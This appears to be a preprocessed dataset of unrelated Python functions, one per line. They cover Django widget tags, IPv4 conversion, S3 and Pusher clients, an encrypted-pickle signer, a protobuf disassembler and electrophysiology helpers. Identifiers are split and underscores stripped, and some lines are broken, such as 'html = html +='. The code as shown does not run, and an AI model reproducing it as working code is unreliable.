def using ( context , alias ) : # An empty alias means look in the current widget set. if alias == '' : yield context else : try : widgets = context . render context [ WIDGET CONTEXT KEY ] except Key Error : raise template . Template Syntax Error ( 'No widget libraries loaded!' ) try : block set = widgets [ alias ] except Key Error : raise template . Template Syntax Error ( 'No widget library loaded for alias: %r' % alias ) context . render context . push ( ) context . render context [ BLOCK CONTEXT KEY ] = block set context . render context [ WIDGET CONTEXT KEY ] = widgets yield context context . render context . pop ( )
def find block ( context , * names ) : block set = context . render context [ BLOCK CONTEXT KEY ] for name in names : block = block set . get block ( name ) if block is not None : return block raise template . Template Syntax Error ( 'No widget found for: %r' % ( names , ) )
def load widgets ( context , * * kwargs ) : soft = kwargs . pop ( ' soft' , False ) try : widgets = context . render context [ WIDGET CONTEXT KEY ] except Key Error : widgets = context . render context [ WIDGET CONTEXT KEY ] = { } for alias , template name in kwargs . items ( ) : if soft and alias in widgets : continue with context . render context . push ( { BLOCK CONTEXT KEY : Block Context ( ) } ) : blocks = resolve blocks ( template name , context ) widgets [ alias ] = blocks return ''
def auto widget ( field ) : # Auto-detect info = { 'widget' : field . field . widget . class . name , 'field' : field . field . class . name , 'name' : field . name , } return [ fmt . format ( * * info ) for fmt in ( '{field} {widget} {name}' , '{field} {name}' , '{widget} {name}' , '{field} {widget}' , '{name}' , '{widget}' , '{field}' , ) ]
def display ( self ) : if not self . is group ( ) : return self . display return ( ( force text ( k ) , v ) for k , v in self . display )
def stored messages list ( context , num elements = 10 ) : if "user" in context : user = context [ "user" ] if user . is authenticated ( ) : qs = Inbox . objects . select related ( "message" ) . filter ( user = user ) return { "messages" : qs [ : num elements ] , "count" : qs . count ( ) , }
def stored messages count ( context ) : if "user" in context : user = context [ "user" ] if user . is authenticated ( ) : return Inbox . objects . select related ( "message" ) . filter ( user = user ) . count ( )
def stored messages archive ( context , num elements = 10 ) : if "user" in context : user = context [ "user" ] if user . is authenticated ( ) : qs = Message Archive . objects . select related ( "message" ) . filter ( user = user ) return { "messages" : qs [ : num elements ] , "count" : qs . count ( ) , }
def jocker ( test options = None ) : version = ver check ( ) options = test options or docopt ( doc , version = version ) set global verbosity level ( options . get ( '--verbose' ) ) jocker lgr . debug ( options ) jocker run ( options )
def configure custom ( self , config ) : c = config . pop ( '()' ) if not hasattr ( c , ' call ' ) and hasattr ( types , 'Class Type' ) and isinstance ( c , types . Class Type ) : c = self . resolve ( c ) props = config . pop ( '.' , None ) # Check for valid identifiers kwargs = dict ( ( k , config [ k ] ) for k in config if valid ident ( k ) ) result = c ( * * kwargs ) if props : for name , value in props . items ( ) : setattr ( result , name , value ) return result
def upload gif ( gif ) : client id = os . environ . get ( 'IMGUR API ID' ) client secret = os . environ . get ( 'IMGUR API SECRET' ) if client id is None or client secret is None : click . echo ( 'Cannot upload - could not find IMGUR API ID or IMGUR API SECRET environment variables' ) return client = Imgur Client ( client id , client secret ) click . echo ( 'Uploading file {}' . format ( click . format filename ( gif ) ) ) response = client . upload from path ( gif ) click . echo ( 'File uploaded - see your gif at {}' . format ( response [ 'link' ] ) )
def is dot ( ip ) : octets = str ( ip ) . split ( '.' ) if len ( octets ) != 4 : return False for i in octets : try : val = int ( i ) except Value Error : return False if val > 255 or val < 0 : return False return True
def is bin ( ip ) : try : ip = str ( ip ) if len ( ip ) != 32 : return False dec = int ( ip , 2 ) except ( Type Error , Value Error ) : return False if dec > 4294967295 or dec < 0 : return False return True
def is oct ( ip ) : try : dec = int ( str ( ip ) , 8 ) except ( Type Error , Value Error ) : return False if dec > 0o37777777777 or dec < 0 : return False return True
def is dec ( ip ) : try : dec = int ( str ( ip ) ) except Value Error : return False if dec > 4294967295 or dec < 0 : return False return True
def is bits nm ( nm ) : try : bits = int ( str ( nm ) ) except Value Error : return False if bits > 32 or bits < 0 : return False return True
def is wildcard nm ( nm ) : try : dec = 0x FFFFFFFF - dot to dec ( nm , check = True ) except Value Error : return False if dec in NETMASKS VALUES : return True return False
def dot to dec ( ip , check = True ) : if check and not is dot ( ip ) : raise Value Error ( ' dot to dec: invalid IP: "%s"' % ip ) octets = str ( ip ) . split ( '.' ) dec = 0 dec |= int ( octets [ 0 ] ) << 24 dec |= int ( octets [ 1 ] ) << 16 dec |= int ( octets [ 2 ] ) << 8 dec |= int ( octets [ 3 ] ) return dec
def dec to dot ( ip ) : first = int ( ( ip >> 24 ) & 255 ) second = int ( ( ip >> 16 ) & 255 ) third = int ( ( ip >> 8 ) & 255 ) fourth = int ( ip & 255 ) return '%d.%d.%d.%d' % ( first , second , third , fourth )
def hex to dec ( ip , check = True ) : if check and not is hex ( ip ) : raise Value Error ( ' hex to dec: invalid IP: "%s"' % ip ) if isinstance ( ip , int ) : ip = hex ( ip ) return int ( str ( ip ) , 16 )
def oct to dec ( ip , check = True ) : if check and not is oct ( ip ) : raise Value Error ( ' oct to dec: invalid IP: "%s"' % ip ) if isinstance ( ip , int ) : ip = oct ( ip ) return int ( str ( ip ) , 8 )
def bin to dec ( ip , check = True ) : if check and not is bin ( ip ) : raise Value Error ( ' bin to dec: invalid IP: "%s"' % ip ) if isinstance ( ip , int ) : ip = str ( ip ) return int ( str ( ip ) , 2 )
def dec to bin ( ip ) : bits = [ ] while ip : bits . append ( BYTES TO BITS [ ip & 255 ] ) ip >>= 8 bits . reverse ( ) return '' . join ( bits ) or 32 * '0'
def bits to dec ( nm , check = True ) : if check and not is bits nm ( nm ) : raise Value Error ( ' bits to dec: invalid netmask: "%s"' % nm ) bits = int ( str ( nm ) ) return VALID NETMASKS [ bits ]
def wildcard to dec ( nm , check = False ) : if check and not is wildcard nm ( nm ) : raise Value Error ( ' wildcard to dec: invalid netmask: "%s"' % nm ) return 0x FFFFFFFF - dot to dec ( nm , check = False )
def convert ( ip , notation , inotation , check , isnm ) : inotation orig = inotation notation orig = notation inotation = get notation ( inotation ) notation = get notation ( notation ) if inotation is None : raise Value Error ( ' convert: unknown input notation: "%s"' % inotation orig ) if notation is None : raise Value Error ( ' convert: unknown output notation: "%s"' % notation orig ) docheck = check or False if inotation == IP UNKNOWN : inotation = detect ( ip , isnm ) if inotation == IP UNKNOWN : raise Value Error ( ' convert: unable to guess input notation or invalid value' ) if check is None : docheck = True # We  always  check this case later. if isnm : docheck = False dec = 0 if inotation == IP DOT : dec = dot to dec ( ip , docheck ) elif inotation == IP HEX : dec = hex to dec ( ip , docheck ) elif inotation == IP BIN : dec = bin to dec ( ip , docheck ) elif inotation == IP OCT : dec = oct to dec ( ip , docheck ) elif inotation == IP DEC : dec = dec to dec long ( ip , docheck ) elif isnm and inotation == NM BITS : dec = bits to dec ( ip , docheck ) elif isnm and inotation == NM WILDCARD : dec = wildcard to dec ( ip , docheck ) else : raise Value Error ( ' convert: unknown IP/netmask notation: "%s"' % inotation orig ) # Ensure this is a valid netmask. if isnm and dec not in NETMASKS VALUES : raise Value Error ( ' convert: invalid netmask: "%s"' % ip ) if notation == IP DOT : return dec to dot ( dec ) elif notation == IP HEX : return dec to hex ( dec ) elif notation == IP BIN : return dec to bin ( dec ) elif notation == IP OCT : return dec to oct ( dec ) elif notation == IP DEC : return dec to dec str ( dec ) elif isnm and notation == NM BITS : return dec to bits ( dec ) elif isnm and notation == NM WILDCARD : return dec to wildcard ( dec ) else : raise Value Error ( 'convert: unknown notation: "%s"' % notation orig )
def convert nm ( nm , notation = IP DOT , inotation = IP UNKNOWN , check = True ) : return convert ( nm , notation , inotation , check = check , isnm = True )
def add ( self , other ) : if isinstance ( other , self . class ) : sum = self . ip dec + other . ip dec elif isinstance ( other , int ) : sum = self . ip dec + other else : other = self . class ( other ) sum = self . ip dec + other . ip dec return sum
def sub ( self , other ) : if isinstance ( other , self . class ) : sub = self . ip dec - other . ip dec if isinstance ( other , int ) : sub = self . ip dec - other else : other = self . class ( other ) sub = self . ip dec - other . ip dec return sub
def get bits ( self ) : return convert ( self . ip , notation = NM BITS , inotation = IP DOT , check = False , isnm = self . isnm )
def get wildcard ( self ) : return convert ( self . ip , notation = NM WILDCARD , inotation = IP DOT , check = False , isnm = self . isnm )
def set ( self , ip , netmask = None ) : if isinstance ( ip , str ) and netmask is None : ipnm = ip . split ( '/' ) if len ( ipnm ) != 2 : raise Value Error ( 'set: invalid CIDR: "%s"' % ip ) ip = ipnm [ 0 ] netmask = ipnm [ 1 ] if isinstance ( ip , I Pv4Address ) : self . ip = ip else : self . ip = I Pv4Address ( ip ) if isinstance ( netmask , I Pv4Net Mask ) : self . nm = netmask else : self . nm = I Pv4Net Mask ( netmask ) ipl = int ( self . ip ) nml = int ( self . nm ) base add = ipl & nml self . ip num = 0x FFFFFFFF - 1 - nml # NOTE: quite a mess. #      This's here to handle /32 (-1) and /31 (0) netmasks. if self . ip num in ( - 1 , 0 ) : if self . ip num == - 1 : self . ip num = 1 else : self . ip num = 2 self . net ip = None self . bc ip = None self . first ip dec = base add self . first ip = I Pv4Address ( self . first ip dec , notation = IP DEC ) if self . ip num == 1 : last ip dec = self . first ip dec else : last ip dec = self . first ip dec + 1 self . last ip = I Pv4Address ( last ip dec , notation = IP DEC ) return self . net ip = I Pv4Address ( base add , notation = IP DEC ) self . bc ip = I Pv4Address ( base add + self . ip num + 1 , notation = IP DEC ) self . first ip dec = base add + 1 self . first ip = I Pv4Address ( self . first ip dec , notation = IP DEC ) self . last ip = I Pv4Address ( base add + self . ip num , notation = IP DEC )
def set ip ( self , ip ) : self . set ( ip = ip , netmask = self . nm )
def set netmask ( self , netmask ) : self . set ( ip = self . ip , netmask = netmask )
async def copy storage object ( self , source bucket , source key , bucket , key ) : info = await self . head object ( Bucket = source bucket , Key = source key ) size = info [ 'Content Length' ] if size > MULTI PART SIZE : result = await multipart copy ( self , source bucket , source key , bucket , key , size ) else : result = await self . copy object ( Bucket = bucket , Key = key , Copy Source = source string ( source bucket , source key ) ) return result
async def upload file ( self , full path ) : rel path = os . path . relpath ( full path , self . folder ) key = s3 key ( os . path . join ( self . key , rel path ) ) ct = self . content types . get ( key . split ( '.' ) [ - 1 ] ) with open ( full path , 'rb' ) as fp : file = fp . read ( ) try : await self . botocore . upload file ( self . bucket , file , key = key , Content Type = ct ) except Exception as exc : LOGGER . error ( 'Could not upload "%s": %s' , key , exc ) self . failures [ key ] = self . all . pop ( full path ) return size = self . all . pop ( full path ) self . success [ key ] = size self . total size += size percentage = 100 * ( 1 - len ( self . all ) / self . total files ) message = '{0:.0f}% completed - uploaded "{1}" - {2}' . format ( percentage , key , convert bytes ( size ) ) LOGGER . info ( message )
async def trigger ( self , event , data = None , socket id = None ) : json data = json . dumps ( data , cls = self . pusher . encoder ) query string = self . signed query ( event , json data , socket id ) signed path = "%s?%s" % ( self . path , query string ) pusher = self . pusher absolute url = pusher . get absolute path ( signed path ) response = await pusher . http . post ( absolute url , data = json data , headers = [ ( 'Content-Type' , 'application/json' ) ] ) response . raise for status ( ) return response . status code == 202
async def connect ( self ) : if not self . consumer : waiter = self . waiter = asyncio . Future ( ) try : address = self . websocket host ( ) self . logger . info ( 'Connect to %s' , address ) self . consumer = await self . http . get ( address ) if self . consumer . status code != 101 : raise Pusher Error ( "Could not connect to websocket" ) except Exception as exc : waiter . set exception ( exc ) raise else : await waiter return self . consumer
def on message ( self , websocket , message ) : waiter = self . waiter self . waiter = None encoded = json . loads ( message ) event = encoded . get ( 'event' ) channel = encoded . get ( 'channel' ) data = json . loads ( encoded . get ( 'data' ) ) try : if event == PUSHER ERROR : raise Pusher Error ( data [ 'message' ] , data [ 'code' ] ) elif event == PUSHER CONNECTION : self . socket id = data . get ( 'socket id' ) self . logger . info ( 'Succesfully connected on socket %s' , self . socket id ) waiter . set result ( self . socket id ) elif event == PUSHER SUBSCRIBED : self . logger . info ( 'Succesfully subscribed to %s' , encoded . get ( 'channel' ) ) elif channel : self [ channel ] . event ( event , data ) except Exception as exc : if waiter : waiter . set exception ( exc ) else : self . logger . exception ( 'pusher error' )
def const equal ( str a , str b ) : if len ( str a ) != len ( str b ) : return False result = True for i in range ( len ( str a ) ) : result &= ( str a [ i ] == str b [ i ] ) return result
def decode html entities ( html ) : if not html : return html for entity , char in six . iteritems ( html entity map ) : html = html . replace ( entity , char ) return html
def set algorithms ( self , signature = None , encryption = None , serialization = None , compression = None ) : self . signature algorithms = self . update dict ( signature , self . DEFAULT SIGNATURE ) self . encryption algorithms = self . update dict ( encryption , self . DEFAULT ENCRYPTION ) self . serialization algorithms = self . update dict ( serialization , self . DEFAULT SERIALIZATION ) self . compression algorithms = self . update dict ( compression , self . DEFAULT COMPRESSION )
def get algorithms ( self ) : return { 'signature' : self . signature algorithms , 'encryption' : self . encryption algorithms , 'serialization' : self . serialization algorithms , 'compression' : self . compression algorithms , }
def set options ( self , options ) : if not options : return self . options . copy ( ) options = options . copy ( ) if 'magic' in options : self . set magic ( options [ 'magic' ] ) del ( options [ 'magic' ] ) if 'flags' in options : flags = options [ 'flags' ] del ( options [ 'flags' ] ) for key , value in flags . iteritems ( ) : if not isinstance ( value , bool ) : raise Type Error ( 'Invalid flag type for: %s' % key ) else : flags = self . options [ 'flags' ] if 'info' in options : del ( options [ 'info' ] ) for key , value in options . iteritems ( ) : if not isinstance ( value , int ) : raise Type Error ( 'Invalid option type for: %s' % key ) if value < 0 or value > 255 : raise Value Error ( 'Option value out of range for: %s' % key ) new options = self . options . copy ( ) new options . update ( options ) new options [ 'flags' ] . update ( flags ) return new options
def verify signature ( self , data ) : data = self . remove magic ( data ) data = urlsafe nopadding b64decode ( data ) options = self . read header ( data ) data = self . add magic ( data ) self . unsign data ( data , options )
def encode ( self , data , algorithm , key = None ) : if algorithm [ 'type' ] == 'hmac' : return data + self . hmac generate ( data , algorithm , key ) elif algorithm [ 'type' ] == 'aes' : return self . aes encrypt ( data , algorithm , key ) elif algorithm [ 'type' ] == 'no-serialization' : return data elif algorithm [ 'type' ] == 'json' : return json . dumps ( data ) elif algorithm [ 'type' ] == 'no-compression' : return data elif algorithm [ 'type' ] == 'gzip' : return self . zlib compress ( data , algorithm ) else : raise Exception ( 'Algorithm not supported: %s' % algorithm [ 'type' ] )
def decode ( self , data , algorithm , key = None ) : if algorithm [ 'type' ] == 'hmac' : verify signature = data [ - algorithm [ 'hash size' ] : ] data = data [ : - algorithm [ 'hash size' ] ] signature = self . hmac generate ( data , algorithm , key ) if not const equal ( verify signature , signature ) : raise Exception ( 'Invalid signature' ) return data elif algorithm [ 'type' ] == 'aes' : return self . aes decrypt ( data , algorithm , key ) elif algorithm [ 'type' ] == 'no-serialization' : return data elif algorithm [ 'type' ] == 'json' : return json . loads ( data ) elif algorithm [ 'type' ] == 'no-compression' : return data elif algorithm [ 'type' ] == 'gzip' : return self . zlib decompress ( data , algorithm ) else : raise Exception ( 'Algorithm not supported: %s' % algorithm [ 'type' ] )
def sign data ( self , data , options ) : if options [ 'signature algorithm id' ] not in self . signature algorithms : raise Exception ( 'Unknown signature algorithm id: %d' % options [ 'signature algorithm id' ] ) signature algorithm = self . signature algorithms [ options [ 'signature algorithm id' ] ] algorithm = self . get algorithm info ( signature algorithm ) key salt = get random bytes ( algorithm [ 'salt size' ] ) key = self . generate key ( options [ 'signature passphrase id' ] , self . signature passphrases , key salt , algorithm ) data = self . encode ( data , algorithm , key ) return data + key salt
def unsign data ( self , data , options ) : if options [ 'signature algorithm id' ] not in self . signature algorithms : raise Exception ( 'Unknown signature algorithm id: %d' % options [ 'signature algorithm id' ] ) signature algorithm = self . signature algorithms [ options [ 'signature algorithm id' ] ] algorithm = self . get algorithm info ( signature algorithm ) key salt = '' if algorithm [ 'salt size' ] : key salt = data [ - algorithm [ 'salt size' ] : ] data = data [ : - algorithm [ 'salt size' ] ] key = self . generate key ( options [ 'signature passphrase id' ] , self . signature passphrases , key salt , algorithm ) data = self . decode ( data , algorithm , key ) return data
def remove magic ( self , data ) : if not self . magic : return data magic size = len ( self . magic ) magic = data [ : magic size ] if magic != self . magic : raise Exception ( 'Invalid magic' ) data = data [ magic size : ] return data
def add header ( self , data , options ) : # pylint: disable=W0142 version info = self . get version info ( options [ 'version' ] ) flags = options [ 'flags' ] header flags = dict ( ( i , str ( int ( j ) ) ) for i , j in options [ 'flags' ] . iteritems ( ) ) header flags = '' . join ( version info [ 'flags' ] ( * * header flags ) ) header flags = int ( header flags , 2 ) options [ 'flags' ] = header flags header = version info [ 'header' ] header = header ( * * options ) header = pack ( version info [ 'header format' ] , * header ) if 'timestamp' in flags and flags [ 'timestamp' ] : timestamp = long ( time ( ) ) timestamp = pack ( version info [ 'timestamp format' ] , timestamp ) header = header + timestamp return header + data
def read header ( self , data ) : # pylint: disable=W0212 version = self . read version ( data ) version info = self . get version info ( version ) header data = data [ : version info [ 'header size' ] ] header = version info [ 'header' ] header = header . make ( unpack ( version info [ 'header format' ] , header data ) ) header = dict ( header . asdict ( ) ) flags = list ( "{0:0>8b}" . format ( header [ 'flags' ] ) ) flags = dict ( version info [ 'flags' ] . make ( flags ) . asdict ( ) ) flags = dict ( ( i , bool ( int ( j ) ) ) for i , j in flags . iteritems ( ) ) header [ 'flags' ] = flags timestamp = None if flags [ 'timestamp' ] : ts start = version info [ 'header size' ] ts end = ts start + version info [ 'timestamp size' ] timestamp data = data [ ts start : ts end ] timestamp = unpack ( version info [ 'timestamp format' ] , timestamp data ) [ 0 ] header [ 'info' ] = { 'timestamp' : timestamp } return header
def remove header ( self , data , options ) : version info = self . get version info ( options [ 'version' ] ) header size = version info [ 'header size' ] if options [ 'flags' ] [ 'timestamp' ] : header size += version info [ 'timestamp size' ] data = data [ header size : ] return data
def read version ( self , data ) : version = ord ( data [ 0 ] ) if version not in self . VERSIONS : raise Exception ( 'Version not defined: %d' % version ) return version
def generate key ( pass id , passphrases , salt , algorithm ) : if pass id not in passphrases : raise Exception ( 'Passphrase not defined for id: %d' % pass id ) passphrase = passphrases [ pass id ] if len ( passphrase ) < 32 : raise Exception ( 'Passphrase less than 32 characters long' ) digestmod = Encrypted Pickle . get hashlib ( algorithm [ 'pbkdf2 algorithm' ] ) encoder = PBKDF2 ( passphrase , salt , iterations = algorithm [ 'pbkdf2 iterations' ] , digestmodule = digestmod ) return encoder . read ( algorithm [ 'key size' ] )
def update dict ( data , default data , replace data = False ) : if not data : data = default data . copy ( ) return data if not isinstance ( data , dict ) : raise Type Error ( 'Value not dict type' ) if len ( data ) > 255 : raise Value Error ( 'More than 255 values defined' ) for i in data . keys ( ) : if not isinstance ( i , int ) : raise Type Error ( 'Index not int type' ) if i < 0 or i > 255 : raise Value Error ( 'Index value out of range' ) if not replace data : data . update ( default data ) return data
def dump field ( self , fd ) : v = { } v [ 'label' ] = Pbd . LABELS [ fd . label ] v [ 'type' ] = fd . type name if len ( fd . type name ) > 0 else Pbd . TYPES [ fd . type ] v [ 'name' ] = fd . name v [ 'number' ] = fd . number v [ 'default' ] = '[default = {}]' . format ( fd . default value ) if len ( fd . default value ) > 0 else '' f = '{label} {type} {name} = {number} {default};' . format ( * * v ) f = ' ' . join ( f . split ( ) ) self . print ( f ) if len ( fd . type name ) > 0 : self . uses . append ( fd . type name )
def disassemble ( self ) : ser pb = open ( self . input file , 'rb' ) . read ( ) # Read serialized pb file fd = File Descriptor Proto ( ) fd . Parse From String ( ser pb ) self . name = fd . name self . print ( ) self . print ( 'syntax = "proto2";' ) self . print ( '' ) if len ( fd . package ) > 0 : self . print ( 'package {};' . format ( fd . package ) ) self . package = fd . package else : self . print ( '// Package not defined' ) self . walk ( fd )
def find imports ( self , pbds ) : # List of types used, but not defined imports = list ( set ( self . uses ) . difference ( set ( self . defines ) ) ) # Clumpsy, but enought for now  for imp in imports : for p in pbds : if imp in p . defines : self . imports . append ( p . name ) break self . imports = list ( set ( self . imports ) ) for import file in self . imports : self . lines . insert ( 2 , 'import "{}";' . format ( import file ) )
def abf I Dfrom Fname ( fname ) : fname = os . path . abspath ( fname ) basename = os . path . basename ( fname ) return os . path . splitext ( basename ) [ 0 ]
def abf Protocol ( fname ) : f = open ( fname , 'rb' ) raw = f . read ( 30 * 1000 ) #it should be in the first 30k of the file f . close ( ) raw = raw . decode ( "utf-8" , "ignore" ) raw = raw . split ( "Clampex" ) [ 1 ] . split ( ".pro" ) [ 0 ] protocol = os . path . basename ( raw ) # the whole protocol filename protocol ID = protocol . split ( " " ) [ 0 ] # just the first number return protocol ID
def header HTML ( header , fname ) : html = "<html><body><code>" html += "<h2>%s</h2>" % ( fname ) html += pprint . pformat ( header , indent = 1 ) html = html . replace ( "\n" , '<br>' ) . replace ( " " , "&nbsp;" ) html = html . replace ( r"\x00" , "" ) html += "</code></body></html>" print ( "saving header file:" , fname ) f = open ( fname , 'w' ) f . write ( html ) f . close ( ) webbrowser . open ( fname )
def setsweep ( self , sweep = 0 , channel = 0 ) : try : sweep = int ( sweep ) except : self . log . error ( "trying to set sweep to [%s]" , sweep ) return if sweep < 0 : sweep = self . sweeps - 1 - sweep # if negative, start from the end sweep = max ( 0 , min ( sweep , self . sweeps - 1 ) ) # correct for out of range sweeps if 'sweep' in dir ( self ) and self . sweep == sweep and self . derivative is False : self . log . debug ( "sweep %d already set" , sweep ) return #self.log.debug("loading sweep %d (Ch%d)",sweep,channel) self . channels = self . AB Fblock . segments [ sweep ] . size [ "analogsignals" ] if self . channels > 1 and sweep == 0 : self . log . info ( "WARNING: multichannel not yet supported!" ) #TODO: self . trace = self . AB Fblock . segments [ sweep ] . analogsignals [ channel ] self . sweep = sweep # currently selected sweep self . channel = channel # currently selected channel # sweep information self . rate = int ( self . trace . sampling rate ) # Hz self . period = float ( 1 / self . rate ) # seconds (inverse of sample rate) self . points Per Sec = int ( self . rate ) # for easy access self . points Per Ms = int ( self . rate / 1000.0 ) # for easy access self . sweep Size = len ( self . trace ) # number of data points per sweep self . sweep Interval = self . trace . duration . magnitude # sweep interval (seconds) self . sweep Length = float ( self . trace . t stop - self . trace . t start ) # in seconds self . length = self . sweep Length * self . sweeps # length (sec) of total recording self . length Minutes = self . length / 60.0 # length (minutes) of total recording if str ( self . trace . dimensionality ) == 'p A' : self . units , self . units2 = "p A" , "clamp current (p A)" self . units D , self . units D2 = "p A/ms" , "current velocity (p A/ms)" self . proto Units , self . proto Units2 = "m V" , "command voltage (m V)" elif str ( self . trace . dimensionality ) == 'm V' : self . units , self . units2 = "m V" , "membrane potential (m V)" self . units D , self . units D2 = "V/s" , "potential velocity (V/s)" self . proto Units , self . proto Units2 = "p A" , "command current (p A)" else : self . units , self . units2 = "?" , "unknown units" self . units D , self . units D2 = "?" , "unknown units" # sweep data self . sweep Y = self . trace . magnitude # sweep data (m V or p A) self . sweep T = self . trace . times . magnitude # actual sweep times (sec) self . sweep Start = float ( self . trace . t start ) # time start of sweep (sec) self . sweep X2 = self . sweep T - self . trace . t start . magnitude # sweeps overlap self . sweep X = self . sweep X2 + sweep * self . sweep Interval # assume no gaps if self . derivative : self . log . debug ( "taking derivative" ) #self.sweep D=np.diff(self.sweep Y) # take derivative self . sweep D = self . sweep Y [ 1 : ] - self . sweep Y [ : - 1 ] # better? self . sweep D = np . insert ( self . sweep D , 0 , self . sweep D [ 0 ] ) # add a point self . sweep D /= ( self . period * 1000 ) # correct for sample rate else : self . sweep D = [ 0 ] # derivative is forced to be empty # generate the protocol too self . generate protocol ( )
def setsweeps ( self ) : for sweep in range ( self . sweeps ) : self . setsweep ( sweep ) yield self . sweep
def comments load ( self ) : self . comment times , self . comment sweeps , self . comment tags = [ ] , [ ] , [ ] self . comments = 0 # will be >0 if comments exist self . comment text = "" try : # this used to work self . comment tags = list ( self . AB Fblock . segments [ 0 ] . eventarrays [ 0 ] . annotations [ 'comments' ] ) self . comment times = list ( self . AB Fblock . segments [ 0 ] . eventarrays [ 0 ] . times / self . trace . itemsize ) self . comment sweeps = list ( self . comment times ) except : # now this notation seems to work for events in self . AB Fblock . segments [ 0 ] . events : # this should only happen once actually self . comment tags = events . annotations [ 'comments' ] . tolist ( ) self . comment times = np . array ( events . times . magnitude / self . trace . itemsize ) self . comment sweeps = self . comment times / self . sweep Interval for i , c in enumerate ( self . comment tags ) : self . comment tags [ i ] = c . decode ( "utf-8" )
def average ( self , t1 = 0 , t2 = None , setsweep = False ) : if setsweep : self . setsweep ( setsweep ) if t2 is None or t2 > self . sweep Length : t2 = self . sweep Length self . log . debug ( "resetting t2 to [%f]" , t2 ) t1 = max ( t1 , 0 ) if t1 > t2 : self . log . error ( "t1 cannot be larger than t2" ) return False I1 , I2 = int ( t1 * self . points Per Sec ) , int ( t2 * self . points Per Sec ) if I1 == I2 : return np . nan return np . average ( self . sweep Y [ I1 : I2 ] )
def kernel gaussian ( self , size MS , sigma MS = None , forward Only = False ) : sigma MS = size MS / 10 if sigma MS is None else sigma MS size , sigma = size MS * self . points Per Ms , sigma MS * self . points Per Ms self . kernel = swhlab . common . kernel gaussian ( size , sigma , forward Only ) return self . kernel
def dict Flat ( l ) : if type ( l ) is dict : return [ l ] if "numpy" in str ( type ( l ) ) : return l dicts = [ ] for item in l : if type ( item ) == dict : dicts . append ( item ) elif type ( item ) == list : for item2 in item : dicts . append ( item2 ) return dicts
def matrix Values ( matrix , key ) : assert key in matrix . dtype . names col = matrix . dtype . names . index ( key ) values = np . empty ( len ( matrix ) ) * np . nan for i in range ( len ( matrix ) ) : values [ i ] = matrix [ i ] [ col ] return values
def matrix To Dicts ( data ) : # 1D array if "float" in str ( type ( data [ 0 ] ) ) : d = { } for x in range ( len ( data ) ) : d [ data . dtype . names [ x ] ] = data [ x ] return d # 2D array l = [ ] for y in range ( len ( data ) ) : d = { } for x in range ( len ( data [ y ] ) ) : d [ data . dtype . names [ x ] ] = data [ y ] [ x ] l . append ( d ) return l
def html temp launch ( html ) : fname = tempfile . gettempdir ( ) + "/swhlab/temp.html" with open ( fname , 'w' ) as f : f . write ( html ) webbrowser . open ( fname )
def check Out ( thing , html = True ) : msg = "" for name in sorted ( dir ( thing ) ) : if not " " in name : msg += "<b>%s</b>\n" % name try : msg += " ^-VALUE: %s\n" % getattr ( thing , name ) ( ) except : pass if html : html = '<html><body><code>' + msg + '</code></body></html>' html = html . replace ( " " , "&nbsp;" ) . replace ( "\n" , "<br>" ) fname = tempfile . gettempdir ( ) + "/swhlab/checkout.html" with open ( fname , 'w' ) as f : f . write ( html ) webbrowser . open ( fname ) print ( msg . replace ( '<b>' , '' ) . replace ( '</b>' , '' ) )
def matrix To HTML ( data , names = None , units = None , book Name = None , sheet Name = None , x Col = None ) : if not names : names = [ "" ] * len ( data [ 0 ] ) if data . dtype . names : names = list ( data . dtype . names ) if not units : units = [ "" ] * len ( data [ 0 ] ) for i in range ( len ( units ) ) : if names [ i ] in UNITS . keys ( ) : units [ i ] = UNITS [ names [ i ] ] if 'recarray' in str ( type ( data ) ) : #make it a regular array data = data . view ( float ) . reshape ( data . shape + ( - 1 , ) ) if x Col and x Col in names : x Col = names . index ( x Col ) names . insert ( 0 , names [ x Col ] ) units . insert ( 0 , units [ x Col ] ) data = np . insert ( data , 0 , data [ : , x Col ] , 1 ) html Fname = tempfile . gettempdir ( ) + "/swhlab/WKS-%s.%s.html" % ( book Name , sheet Name ) html = html += "<h1>Faux Rigin</h1>" if book Name or sheet Name : html += '<code><b>%s / %s</b></code><br><br>' % ( book Name , sheet Name ) html += "<table>" #cols=list(range(len(names))) col Names = [ '' ] for i in range ( len ( units ) ) : label = "%s (%d)" % ( chr ( i + ord ( 'A' ) ) , i ) col Names . append ( label ) html += html List To TR ( col Names , 'label Col' , 'label Col' ) html += html List To TR ( [ 'Long Name' ] + list ( names ) , 'name' , td1Class = 'label Row' ) html += html List To TR ( [ 'Units' ] + list ( units ) , 'units' , td1Class = 'label Row' ) cut Off = False for y in range ( len ( data ) ) : html += html List To TR ( [ y + 1 ] + list ( data [ y ] ) , tr Class = 'data%d' % ( y % 2 ) , td1Class = 'label Row' ) if y >= 200 : cut Off = True break html += "</table>" html = html . replace ( ">nan<" , ">--<" ) html = html . replace ( ">None<" , "><" ) if cut Off : html += "<h3>... showing only %d of %d rows ...</h3>" % ( y , len ( data ) ) html += "</body></html>" with open ( html Fname , 'w' ) as f : f . write ( html ) webbrowser . open ( html Fname ) return
def XM Lto Python ( xml Str = r"C:\Apps\python Modules\GS Temp.xml" ) : #TODO: this absolute file path crazy stuff needs to stop! if os . path . exists ( xml Str ) : with open ( xml Str ) as f : xml Str = f . read ( ) print ( xml Str ) print ( "DONE" ) return
def algo exp ( x , m , t , b ) : return m * np . exp ( - t * x ) + b
def filter gaussian ( Ys , sigma , plot Too = False ) : time A = time . time ( ) window = scipy . signal . gaussian ( len ( Ys ) , sigma ) window /= sum ( window ) Ys2 = np . convolve ( Ys , window , 'same' ) print ( "LEN:" , len ( Ys2 ) , len ( Ys ) ) time B = time . time ( ) print ( "convolution took %.03f ms" % ( ( time B - time A ) * 1000 ) ) if len ( Ys2 ) != len ( Ys ) : print ( "?!?!?!? convolution point size mismatch" ) if plot Too : pylab . plot ( Ys , label = 'original' , alpha = .2 ) pylab . plot ( Ys2 , 'b-' , label = 'smooth' ) pylab . legend ( ) pylab . show ( ) return Ys2
def where cross ( data , threshold ) : Is = np . where ( data > threshold ) [ 0 ] Is = np . concatenate ( ( [ 0 ] , Is ) ) Ds = Is [ : - 1 ] - Is [ 1 : ] + 1 return Is [ np . where ( Ds ) [ 0 ] + 1 ]
def origin Format ( thing ) : if type ( thing ) is list and type ( thing [ 0 ] ) is dict : return origin Format list Of Dicts ( thing ) if type ( thing ) is list and type ( thing [ 0 ] ) is list : return origin Format list Of Dicts ( dict Flat ( thing ) ) else : print ( " !! I don't know how to format this object!" ) print ( thing )
def pickle save ( thing , fname ) : pickle . dump ( thing , open ( fname , "wb" ) , pickle . HIGHEST PROTOCOL ) return thing
